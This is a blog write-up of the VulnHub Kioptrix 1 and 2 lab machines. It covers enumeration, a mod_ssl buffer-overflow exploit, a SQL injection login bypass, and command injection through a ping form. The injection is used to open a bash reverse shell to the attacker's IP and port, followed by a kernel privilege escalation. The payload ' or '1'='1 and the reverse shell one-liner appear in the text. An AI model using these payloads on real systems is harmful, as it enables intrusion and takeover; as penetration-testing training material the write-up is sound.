---
layout: post
title: "Kioptrix 1 & 2"
date: 2018-11-30 
description: "Writeup of Kioptrix 1 and 2"
tag: CTF
---

After several posts with *HackTheBox* machines, we go back to the origins with *VulnHub*. This time, as they are relatively easy machines, we have a 2 for 1 offer and we are going to play with [Kioptrix 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/) and [Kioptrix 2](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).

### Kioptrix 1

As usual, let's start enumerating the services on the remote machine using nmap. We see that many services appear, so let's launch other tools while we analyze the services manually.

![](/images/posts/Kioptrix1and2/img1.png "nmap results")

One of these tools is *nikto*, which is used to analyze vulnerabilities or configuration flaws in web applications. In the results we see that it has found the Apache module **mod_ssl** which could have an outdated version with a public vulnerability.

![](/images/posts/Kioptrix1and2/img2.png "nikto results")

Let's search the [Exploit Database](https://www.exploit-db.com/) to see if we find results for **mod_ssl 2.8.4**. We see that there are two exploits called *OpenFuck* that allow remote code execution using buffer overflow in **mod_ssl** versions below **2.8.7**.

![](/images/posts/Kioptrix1and2/img3.png "search mod_ssl exploits")

To use the exploit we must first compile it as indicated in the comments. When we run it, we see that we must select the operating system in the remote machine. Using the information obtained with *nmap*, we are going to look for **RedHat** offset.

![](/images/posts/Kioptrix1and2/img4.png "Compile exploit")

![](/images/posts/Kioptrix1and2/img5.png "Search RedHat version")

When we run the exploit, we see that we obtain a reverse shell with elevated privileges.

![](/images/posts/Kioptrix1and2/img6.png "Launch the exploit")

### Kioptrix 2

Like the previous machine, we will start with nmap to enumerate remote services and nikto for web applications.

![](/images/posts/Kioptrix1and2/img7.png "nmap results")

![](/images/posts/Kioptrix1and2/img8.png "nikto results")

We don't see any relevant information detected by nikto, so we will analyze the web application manually. As we can see it is a login page, but trying some default credentials we can't get in.

![](/images/posts/Kioptrix1and2/img9.png "Login web page")

![](/images/posts/Kioptrix1and2/img10.png "Login attempt using common credentials")

The next option is to test if any of the login fields are vulnerable to SLQ injection. We try the classic payload `' or '1'='1` in the password field to see if we can bypass it and make sure that any value is correct. **Bingo**, we have managed to access the administration panel!

![](/images/posts/Kioptrix1and2/img11.png "SQL injection in the password field")

This panel only contains a functionality to ping the IP provided by the user and the result is the output of the ping command.

![](/images/posts/Kioptrix1and2/img12.png "Administratvie console")

![](/images/posts/Kioptrix1and2/img13.png "ping functionality")

This functionality looks suspicious to command injection in case the user input is not correctly sanitized. We are going to use the *ping* `-c` parameter, used to specify the number of requests, to see if the behavior of the functionality is modified and the results of the command reflect the number of requests given.

![](/images/posts/Kioptrix1and2/img14.png "Executing commands")

Using `;` we can chain the execution of a second command once the ping is finished. We could extract information from the machine using `cat`, but we are going to open directly a reverse shell in bash with `bash -i >& /dev/tcp/<LOCAL IP>/<LOCAL PORT> 0>&1`.

![](/images/posts/Kioptrix1and2/img15.png "Obtaining reverse shell")

This time the machine is better configured, and we get a reverse shell with the user who has executed the web application without elevated privileges. Next we are going to start the information gathering of the machine to look for any privilege escalation path.

![](/images/posts/Kioptrix1and2/img16.png "Information gathering")

Searching again the operating system version in [Exploit Database](https://www.exploit-db.com/), we found an exploit that would allow us to elevate privileges using the vulnerability **CVE-2009-2698**.

![](/images/posts/Kioptrix1and2/img17.png "Searching exploits for CentOS version")

To transfer the exploit, we will use the Python **SimpleHTTPServer** module to open a web server and get the file from the victim machine with `wget`.

![](/images/posts/Kioptrix1and2/img18.png "Transfer the exploit code")

Finally, we just need to compile the exploit as the developer says in the comments and run it on the machine to obtain elevated privileges.

![](/images/posts/Kioptrix1and2/img19.png "Executing the exploit")